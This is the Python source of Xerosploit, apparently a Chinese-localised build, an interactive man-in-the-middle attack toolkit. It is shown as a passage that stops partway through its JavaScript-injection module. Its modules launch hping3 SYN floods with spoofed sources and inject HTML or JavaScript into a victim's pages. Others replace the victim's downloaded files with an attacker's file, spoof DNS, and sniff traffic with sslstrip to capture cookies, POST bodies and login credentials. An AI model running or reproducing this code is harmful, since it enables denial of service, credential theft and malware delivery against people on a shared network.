#!/usr/bin/python
#coding=utf-8

#---------------------------------------------------------------------------#
# This file is part of Xerosploit.                                          #
# Xerosploit is free software: you can redistribute it and/or modify        #
# it under the terms of the GNU General Public License as published by      #
# the Free Software Foundation, either version 3 of the License, or         #
# (at your option) any later version.                                       #
#                                                                           #
# Xerosploit is distributed in the hope that it will be useful,             #
# but WITHOUT ANY WARRANTY; without even the implied warranty of            #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             #
# GNU General Public License for more details.                              #
#                                                                           #
# You should have received a copy of the GNU General Public License         #
# along with Xerosploit.  If not, see <http://www.gnu.org/licenses/>.       #
#                                                                           #
#---------------------------------------------------------------------------#
#                                                                           #
#        Copyright © 2016 LionSec (www.lionsec.net)                         #
#                                                                           #
#---------------------------------------------------------------------------#

import os
from terminaltables import DoubleTable
from tabulate import tabulate
from banner import xe_header
import sys, traceback
reload(sys)
sys.setdefaultencoding('utf8')
from time import sleep

#Check if the script is running as root .
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Xerosploit must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")

# Exit message
exit_msg = "\n[++] ( ^_^)／ 关闭中 ... 再见骚年.来加入我们的QQ群：659155551 更多好玩的技术请访问 http://geekeyes.cn/ \n"
def main():
	try:

#Configure the network interface and gateway. 
		def config0():
			global up_interface
			up_interface = open('/opt/xerosploit/tools/files/iface.txt', 'r').read()
			up_interface = up_interface.replace("\n","")
			if up_interface == "0":
				up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
				up_interface = up_interface.replace("\n","")

			global gateway
			gateway = open('/opt/xerosploit/tools/files/gateway.txt', 'r').read()
			gateway = gateway.replace("\n","")
			if gateway == "0":
				gateway = os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read()
				gateway = gateway.replace("\n","")




		def home():

			config0()
			n_name = os.popen('iwgetid -r').read() # Get wireless network name
			n_mac = os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read() # Get network mac
			n_ip = os.popen("hostname -I").read() # Local IP address
			n_host = os.popen("hostname").read() # hostname


# Show a random banner. Configured in banner.py .  
			print (xe_header())

			print ("""
[+]═══════════[ Author : @LionSec1 \033[1;36m_-\|/-_\033[1;m Website: lionsec.net ]═══════════[+]

                      [ Powered by Bettercap and Nmap ]""")

			print(""" \033[1;36m
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                             本机的网络配置信息                              █ 
█      极客之眼团队独家汉化,更多好玩的技术请访问 http://geekeyes.cn/          █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")

			# Print network configuration , using tabulate as table.
			table = [["IP 地址","MAC 地址","网关","网卡接口","主机名"],
					 ["","","","",""],
					 [n_ip,n_mac.upper(),gateway,up_interface,n_host]]
			print (tabulate(table, stralign="center",tablefmt="fancy_grid",headers="firstrow"))
			print ("")



			# Print xerosploits short description , using terminaltables as table. 
			table_datas = [
			    ['\033[1;36m\n工具介绍\n', 'XeroSploit是一个综合性的网络渗透工具包.其目的是拿来进行网络中间人\n攻击测试.此工具又由Bettercap和Nmap工具提供功能模块支持 \n极客之眼团队独家汉化,更多好玩的技术请访问 http://geekeyes.cn/ \033[1;m']
			]
			table = DoubleTable(table_datas)
			print(table.table)


		# Get a list of all currently connected devices , using Nmap.
		def scan(): 
			config0()


			scan = os.popen("nmap " + gateway + "/24 -n -sP ").read()

			f = open('/opt/xerosploit/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(你的设备)\033[1;m"

			
			table_data = [
			    ['IP 地址', 'Mac 地址', '设备制造商'],
			    [devices, devices_mac, devices_name]
			]
			table = DoubleTable(table_data)

			# Show devices found on your network
			print("\033[1;36m[+]═══════════════════[ 局域网里所有设备列表 ]═══════════════════[+]\n\033[1;m")
			print(table.table)
			target_ip()



		# Set the target IP address .
		def target_ip():
			target_parse = " --target " # Bettercap target parse . This variable will be wiped if the user want to perform MITM ATTACK on all the network. 

			print ("\033[1;32m\n[+] 请选择一个目标(例如192.168.1.10),输入'help'获取更多信息.\n\033[1;m")
			target_ips = raw_input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
			
			if target_ips == "back":
				home()
			elif target_ips == "home":
				home()
			elif target_ips == "":
				print ("\033[1;91m\n[!] Please specify a target.\033[1;m") # error message if no target are specified. 
				target_ip()
			target_name = target_ips

			

#modules section
			def program0():
				
				# I have separed target_ip() and program0() to avoid falling into a vicious circle when the user Choose the "all" option
				cmd_target = os.popen("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'").read() # IP forwarding
				print("\033[1;34m\n[++] " + target_name + " 已经被选中做为攻击目标. \033[1;m")
				def option():
					""" Choose a module """
					print("\033[1;32m\n[+] 你想使用什么攻击功能模块,请输入'help'来查看帮助信息.\n\033[1;m")
					options = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
					# Port scanner
					if options == "pscan":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         端口扫描                             █
█                                                              █
█                   探测目标设备开放的端口                     █
█               详细的扫描端口检测目标设备信息                 █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Pscan : You must specify only one target host at a time .\033[1;m")
								option()
							

							print("\033[1;32m\n[+] 输入 'run' 来执行端口扫描功能.\n\033[1;m")
							action_pscan = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
							if action_pscan == "back":
								option()
							elif action_pscan == "exit":
								sys.exit(exit_msg)	
							elif action_pscan == "home":
								home()

								pscan()
							elif action_pscan == "run": 
								print("\033[1;34m\n[++] 请稍等 ... 正在扫描 " + target_name + " \033[1;m")
								scan_port = os.popen("nmap "+ target_ips + " -Pn" ).read()

								save_pscan = open('/opt/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
								if check_open_port == "STATE\n": 

									table_data = [
										['服务', '端口', '状态'],
										[ports_services, ports, ports_state]
									]
									table = DoubleTable(table_data)
									print("\033[1;36m\n[+]═════════[" + target_ips +" 端口扫描结果]═════════[+]\n\033[1;m")
									print(table.table)
									pscan()

								else:
									# if all ports are closed , show error message . 
									print (check_open_port)
									print ("\033[1;91m[!] 检测到 " + target_name + " 没有开放的端口\033[1;m")
									pscan()
							else:
								print("\033[1;91m\n[!] 错误 : 命令输入错误.\033[1;m")
								pscan()


						pscan()

			#DoS attack
					elif options == "dos":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          断网攻击                            █
█                                                              █
█                         让目标IP断网                         █
█                      就这么简单的功能骚年                    █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							 
							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] 攻击 : 每次必须指定一个IP目标 .\033[1;m")
								option()

							print("\033[1;32m\n[+] 请输入 'run' 来执行断网攻击.\n\033[1;m")
							

							action_dos = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_dos == "back":
								option()
							elif action_dos == "exit":
								sys.exit(exit_msg)	
							elif action_dos == "home":
								home()
							elif action_dos == "run":
								
								print("\033[1;34m\n[++] 对 " + target_ips + " 执行断网攻击中 ... \n\n[++] 按'Ctrl + C' 停止攻击.\n\033[1;m")

								dos_cmd = os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source " + target_ips) # Dos command , using hping3
								dos()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dos()
						dos()

			# Ping
					elif options == "ping":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                             Ping                             █
█                                                              █
█                        检查设备的可访问性                    █
█                   并显示数据包到达主机需要多长时间           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Ping : 您一次只能指定一个目标 .\033[1;m")
								option()
							
							
							print("\033[1;32m\n[+] 输入 'run' 来执行PING功能.\n\033[1;m")

							action_ping = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_ping == "back":
								option()
							elif action_ping == "exit":
								sys.exit(exit_msg)	
							elif action_ping == "home":
								home()
							elif action_ping == "run":
								print("\033[1;34m\n[++] PING " + target_ips + " (" + target_ips + ") 56(84) bytes of data ... \n\033[1;m")
								ping_cmd = os.popen("ping -c 5 " + target_ips).read()
								fping = open('/opt/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()

								table_data = [
				    				['发送包', '接收包', '丢包','时间'],
				    				[ping_transmited, ping_receive, ping_lost, ping_time]
								]
								table = DoubleTable(table_data)
								print("\033[1;36m\n[+]═════════[ " + target_ips +" ping 信息统计  ]═════════[+]\n\033[1;m")
								print(table.table)
								ping()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								ping()

						ping()

					elif options == "injecthtml":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         HTML代码注入                         █
█                                                              █
█                  在所有访问的网页中注入HTML代码              █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_html():
							print("\033[1;32m\n[+] 输入 'run' 来执行HTML注入功能.\n\033[1;m")
							action_inject = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_inject == "back":
								option()
							elif action_inject == "exit":
								sys.exit(exit_msg)	
							elif action_inject == "home":
								home()
							elif action_inject == "run":
								print("\033[1;32m\n[+] 请指定一个要注入的HTML文件.\n\033[1;m")
								html_file = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
								
								if html_file == "back":
									inject_html()
								elif html_file == "home":
									home()
								else:

									html_file = html_file.replace("'","")
									print("\033[1;34m\n[++] 注入Html代码中 ... \033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止. \n\033[1;m")
									cmd_code = os.system("cp " + html_file + " /opt/xerosploit/tools/bettercap/modules/tmp/file.html")
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )

									inject_html()

							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								inject_html()
						inject_html()


					elif options == "rdownload":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            替换下载                          █
█                                                              █
█              用你指定的文件替换目标正在下载的文件            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							print("\033[1;32m\n[+] 请输入 'run' 来执行替换下载功能.\n\033[1;m")
							action_rdownload = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_rdownload == "back":
								option()
							elif action_rdownload == "exit":
								sys.exit(exit_msg)	
							elif action_rdownload == "home":
								home()
							elif action_rdownload == "run":
								module = "/opt/xerosploit/tools/bettercap/modules/http/replace_file.rb"
								print("\033[1;32m\n[+] 指定要替换的文件. (比如 XX.exe)\n\033[1;m")
								ext_rdownload = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
								print("\033[1;32m\n[+] 请设置一个和要替换下载文件同名的文件.\n\033[1;m")
								file_rdownload = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m")
								file_rdownload = file_rdownload.replace("'","")
								if file_rdownload == "back":
									rdownload()
								elif file_rdownload == "home":
									home()
								elif file_rdownload == "exit":
									sys.exit(exit_msg)
								else:
								
									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
									rdownload()						
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								rdownload()
						rdownload()
					elif options == "sniff":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                             嗅探                             █
█                                                              █
█                    抓取网络中所有的传输数据                  █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")

						def snif():
							print("\033[1;32m\n[+] 请输入 'run' 来执行嗅探功能.\n\033[1;m")
							action_snif = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
							elif action_snif == "exit":
								sys.exit(exit_msg)	
							elif action_snif == "home":
								home()
							elif action_snif == "run":
								def snif_sslstrip():

									print("\033[1;32m\n[+] 你想加载sslstrip模块吗? (y/n).\n\033[1;m")
									action_snif_sslstrip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] 日志文件将保存在: /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
										print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")

										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")
										def snifflog():
											print("\033[1;32m\n[+] 你要保存日志文件吗 ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] 日志文件已保存. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] 错误 :命令没有被发现,请输入 'y' 或者 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif_sslstrip == "n":
										print("\033[1;34m\n[++] 所有的日志文件保存在 : /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
										print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
										
										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")

										
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif == "back":
										snif()
									elif action_snif == "exit":
										sys.exit(exit_msg)	
									elif action_snif == "home":
										home()
									else:
										print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
										snif_sslstrip()
								snif_sslstrip()
							
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								snif()

						snif()

					elif options == "dspoof":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           DNS 欺骗                           █
█                                                              █
█             劫持目标所有的HTTP访问到你指定的IP地址上         █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							print("\033[1;32m\n[+] 输入 'run' 来运行DNS欺骗功能.\n\033[1;m")
							action_dspoof = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								option()
							elif action_dspoof == "exit":
								sys.exit(exit_msg)	
							elif action_dspoof == "home":
								home()
							elif action_dspoof == "run":
								print("\033[1;32m\n[+] 输入您要重定向的IP地址.\n\033[1;m")
								action_dspoof_ip = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								dns_conf = action_dspoof_ip + " .*\.*"
								outdns = open('/opt/xerosploit/tools/files/dns.conf','w')
								outdns.write(dns_conf)
								outdns.close()

								print("\033[1;34m\n[++] 重定向到所有的流量 " + action_dspoof_ip + " ... \033[1;m")
								print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止. \n\033[1;m")

								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								dspoof()
						dspoof()
					elif options == "yplay":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          播放声音                            █
█                                                              █
█             在所有网页上播放YouTube视频作为背景音乐          █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							print("\033[1;32m\n[+] 输入 'run' 来执行播放声音功能功能.\n\033[1;m")
							action_yplay = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_yplay == "back":
								option()
							elif action_yplay == "exit":
								sys.exit(exit_msg)	
							elif action_yplay == "home":
								home()
							elif action_yplay == "run":
								print("\033[1;32m\n[+] 输入一个youtube视频ID. (比如NvhZu5M41Z8)\n\033[1;m")
								video_id = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
								if video_id == "back":
									option()
								elif video_id == "": # if raw = null
									print("\033[1;91m\n[!] 错误 : 请指定你的视频ID.\033[1;m")
									yplay()
								elif video_id == "exit":
									sys.exit(exit_msg)	
								elif video_id == "home":
									home()
								else:
									code = "<head> "
									code_yplay = open('/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] 正在播放 : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C'来停止 . \n\033[1;m")
									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
									yplay()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								yplay()
						yplay()


					elif options == "replace":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            图像替换                          █
█                                                              █
█             用你指定的图片来替换目标所有的网络浏览图片       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def replace():
							print("\033[1;32m\n[+] 输入 'run' 来执行图片替换功能.\n\033[1;m")
							action_replace = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_replace == "back":
								option()
							elif action_replace == "exit":
								sys.exit(exit_msg)	
							elif action_replace == "home":
								home()
							elif action_replace == "run":
								print("\033[1;32m\n[+] 输入你图片文件的绝对路径. (比如 /home/capitansalami/pictures/fun.png)\n\033[1;m")
								img_replace = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
								img_replace = img_replace.replace("'","")
								if img_replace == "back":
									replace()
								elif img_replace == "exit":
									sys.exit(exit_msg)	
								elif img_replace == "home":
									home()
								else:
									from PIL import Image
									img = Image.open(img_replace)
									img.save('/opt/xerosploit/tools/bettercap/modules/tmp/ximage.png')
									print("\033[1;34m\n[++] 所有的图像将被替换为 " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
									

									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/xerosploit/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)

									replace()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								replace()

						replace()


					elif options == "driftnet":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            图片抓取                          █
█                                                              █
█                    查看目标正在查看的网络图片                █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							print("\033[1;32m\n[+] 按 'run' 来执行图片抓取功能.\n\033[1;m")
							action_driftnet = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_driftnet == "back":
								option()
							elif action_driftnet == "exit":
								sys.exit(exit_msg)	
							elif action_driftnet == "home":
								home()
							elif action_driftnet == "run":
								print("\033[1;34m\n[++] 捕获图像中。。。。 " + target_name + " ... \033[1;m")
								print("\033[1;34m\n[++] 所有抓取到的图片暂时保存在 /opt/xerosploit/xedriftnet \033[1;m")
								print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p /opt/xerosploit/xedriftnet && driftnet -d /opt/xerosploit/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("rm -R /opt/xerosploit/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								driftnet()
						driftnet()

					elif options == "move":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           震动目标的网页                     █
█                                                              █
█                      震动目标浏览的网页内容                  █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							print("\033[1;32m\n[+] 输入 'run' 来执行震动功能.\n\033[1;m")
							action_shakescreen = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_shakescreen == "back":
								option()
							elif action_shakescreen == "exit":
								sys.exit(exit_msg)	
							elif action_shakescreen == "home":
								home()
							elif action_shakescreen == "run":
								print("\033[1;34m\n[++] 启动震动功能中  ... \033[1;m")
								print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
								shakescreen()
							else:
								print("\033[1;91m\n[!] 错误 : 命令没有被发现.\033[1;m")
								shakescreen()

						shakescreen()

					elif options == "injectjs":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          注入JS代码                          █
█                                                              █
█               在所有访问的网页中注入Javascript代码.          █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_j():
							print("\033[1;32m\n[+] 输入 'run' 来执行JS注入功能.\n\033[1;m")
							action_inject_j = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_inject_j == "back":
								option()
							elif action_inject_j == "exit":
								sys.exit(exit_msg)	
							elif action_inject_j == "home":
								home()
							elif action_inject_j == "run":
								print("\033[1;32m\n[+] 请指定一个要注入的JS文件.\n\033[1;m")
								js_file = raw_input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
								js_file = js_file.replace("'","")
								if js_file == "back":
									inject_j()
								elif js_file == "exit":
									sys.exit(exit_msg)	
								elif js_file == "home":
									home()
								else:

									print("\033[1;34m\n[++] 注入Javascript代码中 ... \033[1;m")
									print("\033[1;34m\n[++] 按 'Ctrl + C' 来停止 . \n\033[1;m")
